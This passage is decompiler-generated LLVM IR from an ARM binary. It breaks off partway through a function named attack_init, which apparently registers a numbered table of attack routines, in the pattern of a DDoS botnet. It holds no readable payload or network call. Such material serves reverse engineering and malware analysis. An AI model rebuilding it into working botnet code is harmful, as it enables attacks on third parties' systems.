  %v0_a314 = phi i32 [ %v2_a2cc, %dec_label_pc_a2c4 ], [ %v7_a2ec, %dec_label_pc_a2ec ]
  store i32 %v5_a0d4, i32* %r0.global-to-local, align 4
  %v0_a308 = load i32, i32* @sb, align 4
  store i32 %v0_a308, i32* %r1.global-to-local, align 4
  store i32 %v2_a120, i32* %r2.global-to-local, align 4
  %v0_a310 = load i32, i32* @r5, align 4
  store i32 %v0_a310, i32* %r3.global-to-local, align 4
  %v1_a314 = inttoptr i32 %v0_a314 to i32*
  %v2_a314 = load i32, i32* %v1_a314, align 4
  store i32 %v2_a314, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_a314)
  br label %dec_label_pc_a320

dec_label_pc_a320:                                ; preds = %dec_label_pc_a2e0, %dec_label_pc_a2b4, %dec_label_pc_a300
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_a324 = call i32 @__GI_exit(i32 0)
  store i32 %v1_a324, i32* %r0.global-to-local, align 4
  %v0_a328 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a328, label %bb54, label %.thread17

bb54:                                             ; preds = %dec_label_pc_a320
  %v1_a328 = load i32, i32* %r2.global-to-local, align 4
  %v2_a32c = load i32, i32* @ip, align 4
  %v3_a32c = udiv i32 %v2_a32c, 2048
  %v4_a32c = mul i32 %v2_a32c, 2097152
  %v5_a32c = or i32 %v3_a32c, %v4_a32c
  %v8_a32c = and i32 %v5_a32c, %v1_a328
  store i32 %v8_a32c, i32* %r3.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %dec_label_pc_a320, %bb54
  ret i32 %v1_a324

; uselistorder directives
  uselistorder i1 %v9_a2f8, { 1, 0 }
  uselistorder i32 %v1_a2e0, { 1, 2, 3, 0 }
  uselistorder i1 %v9_a2d8, { 1, 0 }
  uselistorder i32 %v0_a2ac, { 1, 0 }
  uselistorder i32 %v1_a29c, { 1, 2, 0 }
  uselistorder i1 %v2_a270, { 0, 2, 1 }
  uselistorder i1 %v2_a264, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_a24c, { 1, 0 }
  uselistorder i32 %v0_a248, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a234, { 1, 0 }
  uselistorder i32 %v2_a204, { 1, 0 }
  uselistorder i32 %v1_a200, { 2, 0, 1, 3 }
  uselistorder i32 %v4_a1fc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a1e0, { 1, 0 }
  uselistorder i32 %v3_a174, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a164, { 1, 0 }
  uselistorder i32 %v1_a160, { 1, 0 }
  uselistorder i32 %v2_a120, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v4_a0f4, { 1, 0, 2, 3 }
  uselistorder i32 %v5_a0d4, { 1, 0 }
  uselistorder i32 %v1_a0c0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_a0bc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_a0a8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 4, 2, 6, 5, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 6, 7, 3, 4, 5, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 8, 6, 19, 7, 9, 10, 11, 13, 12, 20, 21, 14, 15, 16, 17, 18, 22, 23, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 0, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %dec_label_pc_a320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_a26c, { 5, 4, 0, 1, 2, 3, 6, 7, 8 }
  uselistorder label %dec_label_pc_a214, { 1, 0 }
  uselistorder label %dec_label_pc_a0b0, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_a330 = load i32, i32* @r4, align 4
  store i32 %v3_a330, i32* %stack_var_-24, align 4
  %v6_a330 = load i32, i32* @r5, align 4
  %v9_a330 = load i32, i32* @r6, align 4
  %v12_a330 = load i32, i32* @r7, align 4
  %v15_a330 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a33c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_235e8.65 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_235ec.67 to i32), i32* @r6, align 4
  store i32 52348, i32* %r2.global-to-local, align 4
  store i32 %v2_a33c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_235e9.71 to i32), i32* %r1.global-to-local, align 4
  %v2_a35c = load i32, i32* @global_var_235ec.67, align 4
  %v2_a360 = inttoptr i32 %v2_a33c to i32*
  store i32 52348, i32* %v2_a360, align 4
  %v3_a364 = load i32, i32* @r4, align 4
  %v4_a364 = add i32 %v3_a364, 4
  %v5_a364 = inttoptr i32 %v4_a364 to i8*
  store i8 0, i8* %v5_a364, align 1
  %v0_a368 = load i32, i32* %r1.global-to-local, align 4
  %v3_a368 = mul i32 %v0_a368, 4
  store i32 %v3_a368, i32* %r1.global-to-local, align 4
  %v5_a36c = inttoptr i32 %v2_a35c to i32*
  %v6_a36c = call i32 @realloc(i32* %v5_a36c, i32 %v3_a368, i32 52348, i32 0)
  %v2_a370 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a370 = zext i8 %v2_a370 to i32
  store i32 %v6_a36c, i32* %r2.global-to-local, align 4
  %v0_a378 = load i32, i32* @r4, align 4
  %v5_a378 = mul nuw nsw i32 %v3_a370, 4
  %v6_a378 = add i32 %v5_a378, %v6_a36c
  %v7_a378 = inttoptr i32 %v6_a378 to i32*
  store i32 %v0_a378, i32* %v7_a378, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_235e9.71 to i32), i32* %r3.global-to-local, align 4
  %v1_a388 = load i32, i32* @r6, align 4
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  store i32 %v6_a36c, i32* %v2_a388, align 4
  %v0_a38c = load i32, i32* %r3.global-to-local, align 4
  %v1_a38c = trunc i32 %v0_a38c to i8
  %v2_a38c = load i32, i32* @r5, align 4
  %v3_a38c = inttoptr i32 %v2_a38c to i8*
  store i8 %v1_a38c, i8* %v3_a38c, align 1
  %v2_a390 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d248.73 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_a390, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_235e9.71 to i32), i32* %r1.global-to-local, align 4
  %v2_a3a8 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a3ac = inttoptr i32 %v2_a390 to i32*
  store i32 ptrtoint (i32* @global_var_d248.73 to i32), i32* %v2_a3ac, align 4
  %v0_a3b0 = load i32, i32* @r8, align 4
  %v1_a3b0 = trunc i32 %v0_a3b0 to i8
  %v2_a3b0 = load i32, i32* @r4, align 4
  %v3_a3b0 = add i32 %v2_a3b0, 4
  %v4_a3b0 = inttoptr i32 %v3_a3b0 to i8*
  store i8 %v1_a3b0, i8* %v4_a3b0, align 1
  %v0_a3b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a3b4 = mul i32 %v0_a3b4, 4
  store i32 %v3_a3b4, i32* %r1.global-to-local, align 4
  %v4_a3b8 = inttoptr i32 %v2_a3a8 to i32*
  %v5_a3b8 = call i32 @realloc(i32* %v4_a3b8, i32 %v3_a3b4, i32 %v6_a36c, i32 ptrtoint (i32* @global_var_d248.73 to i32))
  %v2_a3bc = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a3bc = zext i8 %v2_a3bc to i32
  store i32 %v3_a3bc, i32* %r3.global-to-local, align 4
  store i32 %v5_a3b8, i32* %r2.global-to-local, align 4
  %v0_a3c4 = load i32, i32* @r4, align 4
  %v5_a3c4 = mul nuw nsw i32 %v3_a3bc, 4
  %v6_a3c4 = add i32 %v5_a3c4, %v5_a3b8
  %v7_a3c4 = inttoptr i32 %v6_a3c4 to i32*
  store i32 %v0_a3c4, i32* %v7_a3c4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a3cc = load i32, i32* %r3.global-to-local, align 4
  %v1_a3cc = load i32, i32* @r8, align 4
  %v2_a3cc = add i32 %v1_a3cc, %v0_a3cc
  store i32 %v2_a3cc, i32* %r3.global-to-local, align 4
  %v1_a3d4 = trunc i32 %v2_a3cc to i8
  %v2_a3d4 = load i32, i32* @r5, align 4
  %v3_a3d4 = inttoptr i32 %v2_a3d4 to i8*
  store i8 %v1_a3d4, i8* %v3_a3d4, align 1
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = load i32, i32* @r6, align 4
  %v2_a3d8 = inttoptr i32 %v1_a3d8 to i32*
  store i32 %v0_a3d8, i32* %v2_a3d8, align 4
  %v2_a3dc = call i32 @calloc(i32 %v1_a3cc, i32 8)
  %v2_a3e0 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a3e0 = zext i8 %v2_a3e0 to i32
  store i32 ptrtoint (i32* @global_var_d6b4.75 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a3dc, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a3f0 = load i32, i32* @r8, align 4
  %v2_a3f0 = add i32 %v1_a3f0, %v3_a3e0
  store i32 %v2_a3f0, i32* %r1.global-to-local, align 4
  %v2_a3f4 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3dc to i32*
  store i32 ptrtoint (i32* @global_var_d6b4.75 to i32), i32* %v2_a3f8, align 4
  %v3_a3fc = load i32, i32* @r4, align 4
  %v4_a3fc = add i32 %v3_a3fc, 4
  %v5_a3fc = inttoptr i32 %v4_a3fc to i8*
  store i8 2, i8* %v5_a3fc, align 1
  %v0_a400 = load i32, i32* %r1.global-to-local, align 4
  %v3_a400 = mul i32 %v0_a400, 4
  store i32 %v3_a400, i32* %r1.global-to-local, align 4
  %v5_a404 = inttoptr i32 %v2_a3f4 to i32*
  %v6_a404 = call i32 @realloc(i32* %v5_a404, i32 %v3_a400, i32 ptrtoint (i32* @global_var_d6b4.75 to i32), i32 2)
  %v2_a408 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a408 = zext i8 %v2_a408 to i32
  store i32 %v3_a408, i32* %r3.global-to-local, align 4
  store i32 %v6_a404, i32* %r2.global-to-local, align 4
  %v0_a410 = load i32, i32* @r4, align 4
  %v5_a410 = mul nuw nsw i32 %v3_a408, 4
  %v6_a410 = add i32 %v5_a410, %v6_a404
  %v7_a410 = inttoptr i32 %v6_a410 to i32*
  store i32 %v0_a410, i32* %v7_a410, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a418 = load i32, i32* %r3.global-to-local, align 4
  %v1_a418 = load i32, i32* @r8, align 4
  %v2_a418 = add i32 %v1_a418, %v0_a418
  store i32 %v2_a418, i32* %r3.global-to-local, align 4
  %v1_a420 = load i32, i32* @r6, align 4
  %v2_a420 = inttoptr i32 %v1_a420 to i32*
  store i32 %v6_a404, i32* %v2_a420, align 4
  %v0_a424 = load i32, i32* %r3.global-to-local, align 4
  %v1_a424 = trunc i32 %v0_a424 to i8
  %v2_a424 = load i32, i32* @r5, align 4
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  store i8 %v1_a424, i8* %v3_a424, align 1
  %v2_a428 = call i32 @calloc(i32 %v1_a418, i32 8)
  %v2_a42c = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a42c = zext i8 %v2_a42c to i32
  store i32 ptrtoint (i32* @global_var_c9bc.77 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_a428, i32* @r4, align 4
  %v1_a43c = load i32, i32* @r8, align 4
  %v2_a43c = add i32 %v1_a43c, %v3_a42c
  store i32 %v2_a43c, i32* %r1.global-to-local, align 4
  %v2_a440 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a444 = inttoptr i32 %v2_a428 to i32*
  store i32 ptrtoint (i32* @global_var_c9bc.77 to i32), i32* %v2_a444, align 4
  %v0_a448 = load i32, i32* @r7, align 4
  %v1_a448 = trunc i32 %v0_a448 to i8
  %v2_a448 = load i32, i32* @r4, align 4
  %v3_a448 = add i32 %v2_a448, 4
  %v4_a448 = inttoptr i32 %v3_a448 to i8*
  store i8 %v1_a448, i8* %v4_a448, align 1
  %v0_a44c = load i32, i32* %r1.global-to-local, align 4
  %v3_a44c = mul i32 %v0_a44c, 4
  store i32 %v3_a44c, i32* %r1.global-to-local, align 4
  %v4_a450 = inttoptr i32 %v2_a440 to i32*
  %v5_a450 = call i32 @realloc(i32* %v4_a450, i32 %v3_a44c, i32 %v6_a404, i32 ptrtoint (i32* @global_var_c9bc.77 to i32))
  %v2_a454 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a454 = zext i8 %v2_a454 to i32
  store i32 %v3_a454, i32* %r3.global-to-local, align 4
  store i32 %v5_a450, i32* %r2.global-to-local, align 4
  %v0_a45c = load i32, i32* @r4, align 4
  %v5_a45c = mul nuw nsw i32 %v3_a454, 4
  %v6_a45c = add i32 %v5_a45c, %v5_a450
  %v7_a45c = inttoptr i32 %v6_a45c to i32*
  store i32 %v0_a45c, i32* %v7_a45c, align 4
  %v0_a460 = load i32, i32* @r7, align 4
  store i32 %v0_a460, i32* %r1.global-to-local, align 4
  %v0_a464 = load i32, i32* %r3.global-to-local, align 4
  %v1_a464 = load i32, i32* @r8, align 4
  %v2_a464 = add i32 %v1_a464, %v0_a464
  store i32 %v2_a464, i32* %r3.global-to-local, align 4
  %v1_a46c = trunc i32 %v2_a464 to i8
  %v2_a46c = load i32, i32* @r5, align 4
  %v3_a46c = inttoptr i32 %v2_a46c to i8*
  store i8 %v1_a46c, i8* %v3_a46c, align 1
  %v0_a470 = load i32, i32* %r2.global-to-local, align 4
  %v1_a470 = load i32, i32* @r6, align 4
  %v2_a470 = inttoptr i32 %v1_a470 to i32*
  store i32 %v0_a470, i32* %v2_a470, align 4
  %v2_a474 = call i32 @calloc(i32 %v1_a464, i32 %v0_a460)
  %v2_a478 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a478 = zext i8 %v2_a478 to i32
  store i32 ptrtoint (i32* @global_var_c2e4.79 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a474, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a488 = load i32, i32* @r8, align 4
  %v2_a488 = add i32 %v1_a488, %v3_a478
  store i32 %v2_a488, i32* %r1.global-to-local, align 4
  %v2_a48c = load i32, i32* @global_var_235ec.67, align 4
  %v2_a490 = inttoptr i32 %v2_a474 to i32*
  store i32 ptrtoint (i32* @global_var_c2e4.79 to i32), i32* %v2_a490, align 4
  %v3_a494 = load i32, i32* @r4, align 4
  %v4_a494 = add i32 %v3_a494, 4
  %v5_a494 = inttoptr i32 %v4_a494 to i8*
  store i8 3, i8* %v5_a494, align 1
  %v0_a498 = load i32, i32* %r1.global-to-local, align 4
  %v3_a498 = mul i32 %v0_a498, 4
  store i32 %v3_a498, i32* %r1.global-to-local, align 4
  %v5_a49c = inttoptr i32 %v2_a48c to i32*
  %v6_a49c = call i32 @realloc(i32* %v5_a49c, i32 %v3_a498, i32 ptrtoint (i32* @global_var_c2e4.79 to i32), i32 3)
  %v2_a4a0 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a4a0 = zext i8 %v2_a4a0 to i32
  store i32 %v3_a4a0, i32* %r3.global-to-local, align 4
  store i32 %v6_a49c, i32* %r2.global-to-local, align 4
  %v0_a4a8 = load i32, i32* @r4, align 4
  %v5_a4a8 = mul nuw nsw i32 %v3_a4a0, 4
  %v6_a4a8 = add i32 %v5_a4a8, %v6_a49c
  %v7_a4a8 = inttoptr i32 %v6_a4a8 to i32*
  store i32 %v0_a4a8, i32* %v7_a4a8, align 4
  %v0_a4ac = load i32, i32* @r7, align 4
  store i32 %v0_a4ac, i32* %r1.global-to-local, align 4
  %v0_a4b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a4b0 = load i32, i32* @r8, align 4
  %v2_a4b0 = add i32 %v1_a4b0, %v0_a4b0
  store i32 %v2_a4b0, i32* %r3.global-to-local, align 4
  %v1_a4b8 = trunc i32 %v2_a4b0 to i8
  %v2_a4b8 = load i32, i32* @r5, align 4
  %v3_a4b8 = inttoptr i32 %v2_a4b8 to i8*
  store i8 %v1_a4b8, i8* %v3_a4b8, align 1
  %v0_a4bc = load i32, i32* %r2.global-to-local, align 4
  %v1_a4bc = load i32, i32* @r6, align 4
  %v2_a4bc = inttoptr i32 %v1_a4bc to i32*
  store i32 %v0_a4bc, i32* %v2_a4bc, align 4
  %v2_a4c0 = call i32 @calloc(i32 %v1_a4b0, i32 %v0_a4ac)
  %v2_a4c4 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a4c4 = zext i8 %v2_a4c4 to i32
  store i32 ptrtoint (i32* @global_var_bbc0.81 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a4c0, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a4d4 = load i32, i32* @r8, align 4
  %v2_a4d4 = add i32 %v1_a4d4, %v3_a4c4
  store i32 %v2_a4d4, i32* %r1.global-to-local, align 4
  %v2_a4d8 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a4dc = inttoptr i32 %v2_a4c0 to i32*
  store i32 ptrtoint (i32* @global_var_bbc0.81 to i32), i32* %v2_a4dc, align 4
  %v3_a4e0 = load i32, i32* @r4, align 4
  %v4_a4e0 = add i32 %v3_a4e0, 4
  %v5_a4e0 = inttoptr i32 %v4_a4e0 to i8*
  store i8 4, i8* %v5_a4e0, align 1
  %v0_a4e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a4e4 = mul i32 %v0_a4e4, 4
  store i32 %v3_a4e4, i32* %r1.global-to-local, align 4
  %v5_a4e8 = inttoptr i32 %v2_a4d8 to i32*
  %v6_a4e8 = call i32 @realloc(i32* %v5_a4e8, i32 %v3_a4e4, i32 ptrtoint (i32* @global_var_bbc0.81 to i32), i32 4)
  %v2_a4ec = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a4ec = zext i8 %v2_a4ec to i32
  store i32 %v3_a4ec, i32* %r3.global-to-local, align 4
  store i32 %v6_a4e8, i32* %r2.global-to-local, align 4
  %v0_a4f4 = load i32, i32* @r4, align 4
  %v5_a4f4 = mul nuw nsw i32 %v3_a4ec, 4
  %v6_a4f4 = add i32 %v5_a4f4, %v6_a4e8
  %v7_a4f4 = inttoptr i32 %v6_a4f4 to i32*
  store i32 %v0_a4f4, i32* %v7_a4f4, align 4
  %v0_a4f8 = load i32, i32* @r7, align 4
  store i32 %v0_a4f8, i32* %r1.global-to-local, align 4
  %v0_a4fc = load i32, i32* %r3.global-to-local, align 4
  %v1_a4fc = load i32, i32* @r8, align 4
  %v2_a4fc = add i32 %v1_a4fc, %v0_a4fc
  store i32 %v2_a4fc, i32* %r3.global-to-local, align 4
  %v1_a504 = trunc i32 %v2_a4fc to i8
  %v2_a504 = load i32, i32* @r5, align 4
  %v3_a504 = inttoptr i32 %v2_a504 to i8*
  store i8 %v1_a504, i8* %v3_a504, align 1
  %v0_a508 = load i32, i32* %r2.global-to-local, align 4
  %v1_a508 = load i32, i32* @r6, align 4
  %v2_a508 = inttoptr i32 %v1_a508 to i32*
  store i32 %v0_a508, i32* %v2_a508, align 4
  %v2_a50c = call i32 @calloc(i32 %v1_a4fc, i32 %v0_a4f8)
  %v2_a510 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a510 = zext i8 %v2_a510 to i32
  store i32 ptrtoint (i32* @global_var_b394.83 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a50c, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a520 = load i32, i32* @r8, align 4
  %v2_a520 = add i32 %v1_a520, %v3_a510
  store i32 %v2_a520, i32* %r1.global-to-local, align 4
  %v2_a524 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a528 = inttoptr i32 %v2_a50c to i32*
  store i32 ptrtoint (i32* @global_var_b394.83 to i32), i32* %v2_a528, align 4
  %v3_a52c = load i32, i32* @r4, align 4
  %v4_a52c = add i32 %v3_a52c, 4
  %v5_a52c = inttoptr i32 %v4_a52c to i8*
  store i8 5, i8* %v5_a52c, align 1
  %v0_a530 = load i32, i32* %r1.global-to-local, align 4
  %v3_a530 = mul i32 %v0_a530, 4
  store i32 %v3_a530, i32* %r1.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v2_a524 to i32*
  %v6_a534 = call i32 @realloc(i32* %v5_a534, i32 %v3_a530, i32 ptrtoint (i32* @global_var_b394.83 to i32), i32 5)
  %v2_a538 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a538 = zext i8 %v2_a538 to i32
  store i32 %v3_a538, i32* %r3.global-to-local, align 4
  store i32 %v6_a534, i32* %r2.global-to-local, align 4
  %v0_a540 = load i32, i32* @r4, align 4
  %v5_a540 = mul nuw nsw i32 %v3_a538, 4
  %v6_a540 = add i32 %v5_a540, %v6_a534
  %v7_a540 = inttoptr i32 %v6_a540 to i32*
  store i32 %v0_a540, i32* %v7_a540, align 4
  %v0_a544 = load i32, i32* @r7, align 4
  store i32 %v0_a544, i32* %r1.global-to-local, align 4
  %v0_a548 = load i32, i32* %r3.global-to-local, align 4
  %v1_a548 = load i32, i32* @r8, align 4
  %v2_a548 = add i32 %v1_a548, %v0_a548
  store i32 %v2_a548, i32* %r3.global-to-local, align 4
  %v1_a550 = trunc i32 %v2_a548 to i8
  %v2_a550 = load i32, i32* @r5, align 4
  %v3_a550 = inttoptr i32 %v2_a550 to i8*
  store i8 %v1_a550, i8* %v3_a550, align 1
  %v0_a554 = load i32, i32* %r2.global-to-local, align 4
  %v1_a554 = load i32, i32* @r6, align 4
  %v2_a554 = inttoptr i32 %v1_a554 to i32*
  store i32 %v0_a554, i32* %v2_a554, align 4
  %v2_a558 = call i32 @calloc(i32 %v1_a548, i32 %v0_a544)
  %v2_a55c = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a55c = zext i8 %v2_a55c to i32
  store i32 ptrtoint (i32* @global_var_ad34.85 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a558, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a56c = load i32, i32* @r8, align 4
  %v2_a56c = add i32 %v1_a56c, %v3_a55c
  store i32 %v2_a56c, i32* %r1.global-to-local, align 4
  %v2_a570 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a574 = inttoptr i32 %v2_a558 to i32*
  store i32 ptrtoint (i32* @global_var_ad34.85 to i32), i32* %v2_a574, align 4
  %v3_a578 = load i32, i32* @r4, align 4
  %v4_a578 = add i32 %v3_a578, 4
  %v5_a578 = inttoptr i32 %v4_a578 to i8*
  store i8 6, i8* %v5_a578, align 1
  %v0_a57c = load i32, i32* %r1.global-to-local, align 4
  %v3_a57c = mul i32 %v0_a57c, 4
  store i32 %v3_a57c, i32* %r1.global-to-local, align 4
  %v5_a580 = inttoptr i32 %v2_a570 to i32*
  %v6_a580 = call i32 @realloc(i32* %v5_a580, i32 %v3_a57c, i32 ptrtoint (i32* @global_var_ad34.85 to i32), i32 6)
  %v2_a584 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a584 = zext i8 %v2_a584 to i32
  store i32 %v3_a584, i32* %r3.global-to-local, align 4
  store i32 %v6_a580, i32* %r2.global-to-local, align 4
  %v0_a58c = load i32, i32* @r4, align 4
  %v5_a58c = mul nuw nsw i32 %v3_a584, 4
  %v6_a58c = add i32 %v5_a58c, %v6_a580
  %v7_a58c = inttoptr i32 %v6_a58c to i32*
  store i32 %v0_a58c, i32* %v7_a58c, align 4
  %v0_a590 = load i32, i32* @r7, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  %v0_a594 = load i32, i32* %r3.global-to-local, align 4
  %v1_a594 = load i32, i32* @r8, align 4
  %v2_a594 = add i32 %v1_a594, %v0_a594
  store i32 %v2_a594, i32* %r3.global-to-local, align 4
  %v1_a59c = trunc i32 %v2_a594 to i8
  %v2_a59c = load i32, i32* @r5, align 4
  %v3_a59c = inttoptr i32 %v2_a59c to i8*
  store i8 %v1_a59c, i8* %v3_a59c, align 1
  %v0_a5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5a0 = load i32, i32* @r6, align 4
  %v2_a5a0 = inttoptr i32 %v1_a5a0 to i32*
  store i32 %v0_a5a0, i32* %v2_a5a0, align 4
  %v2_a5a4 = call i32 @calloc(i32 %v1_a594, i32 %v0_a590)
  %v2_a5a8 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a5a8 = zext i8 %v2_a5a8 to i32
  store i32 ptrtoint (i32* @global_var_a66c.87 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5a4, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a5b8 = load i32, i32* @r8, align 4
  %v2_a5b8 = add i32 %v1_a5b8, %v3_a5a8
  store i32 %v2_a5b8, i32* %r1.global-to-local, align 4
  %v2_a5bc = load i32, i32* @global_var_235ec.67, align 4
  %v2_a5c0 = inttoptr i32 %v2_a5a4 to i32*
  store i32 ptrtoint (i32* @global_var_a66c.87 to i32), i32* %v2_a5c0, align 4
  %v3_a5c4 = load i32, i32* @r4, align 4
  %v4_a5c4 = add i32 %v3_a5c4, 4
  %v5_a5c4 = inttoptr i32 %v4_a5c4 to i8*
  store i8 7, i8* %v5_a5c4, align 1
  %v0_a5c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5c8 = mul i32 %v0_a5c8, 4
  store i32 %v3_a5c8, i32* %r1.global-to-local, align 4
  %v5_a5cc = inttoptr i32 %v2_a5bc to i32*
  %v6_a5cc = call i32 @realloc(i32* %v5_a5cc, i32 %v3_a5c8, i32 ptrtoint (i32* @global_var_a66c.87 to i32), i32 7)
  %v2_a5d0 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a5d0 = zext i8 %v2_a5d0 to i32
  store i32 %v3_a5d0, i32* %r3.global-to-local, align 4
  store i32 %v6_a5cc, i32* %r2.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  %v5_a5d8 = mul nuw nsw i32 %v3_a5d0, 4
  %v6_a5d8 = add i32 %v5_a5d8, %v6_a5cc
  %v7_a5d8 = inttoptr i32 %v6_a5d8 to i32*
  store i32 %v0_a5d8, i32* %v7_a5d8, align 4
  %v0_a5dc = load i32, i32* @r7, align 4
  store i32 %v0_a5dc, i32* %r1.global-to-local, align 4
  %v0_a5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5e0 = load i32, i32* @r8, align 4
  %v2_a5e0 = add i32 %v1_a5e0, %v0_a5e0
  store i32 %v2_a5e0, i32* %r3.global-to-local, align 4
  %v1_a5e8 = trunc i32 %v2_a5e0 to i8
  %v2_a5e8 = load i32, i32* @r5, align 4
  %v3_a5e8 = inttoptr i32 %v2_a5e8 to i8*
  store i8 %v1_a5e8, i8* %v3_a5e8, align 1
  %v0_a5ec = load i32, i32* %r2.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r6, align 4
  %v2_a5ec = inttoptr i32 %v1_a5ec to i32*
  store i32 %v0_a5ec, i32* %v2_a5ec, align 4
  %v2_a5f0 = call i32 @calloc(i32 %v1_a5e0, i32 %v0_a5dc)
  %v2_a5f4 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a5f4 = zext i8 %v2_a5f4 to i32
  store i32 ptrtoint (i32* @global_var_81d0.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5f0, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r8, align 4
  %v2_a604 = add i32 %v1_a604, %v3_a5f4
  store i32 %v2_a604, i32* %r1.global-to-local, align 4
  %v2_a608 = load i32, i32* @global_var_235ec.67, align 4
  %v2_a60c = inttoptr i32 %v2_a5f0 to i32*
  store i32 ptrtoint (i32* @global_var_81d0.89 to i32), i32* %v2_a60c, align 4
  %v3_a610 = load i32, i32* @r4, align 4
  %v4_a610 = add i32 %v3_a610, 4
  %v5_a610 = inttoptr i32 %v4_a610 to i8*
  store i8 9, i8* %v5_a610, align 1
  %v0_a614 = load i32, i32* %r1.global-to-local, align 4
  %v3_a614 = mul i32 %v0_a614, 4
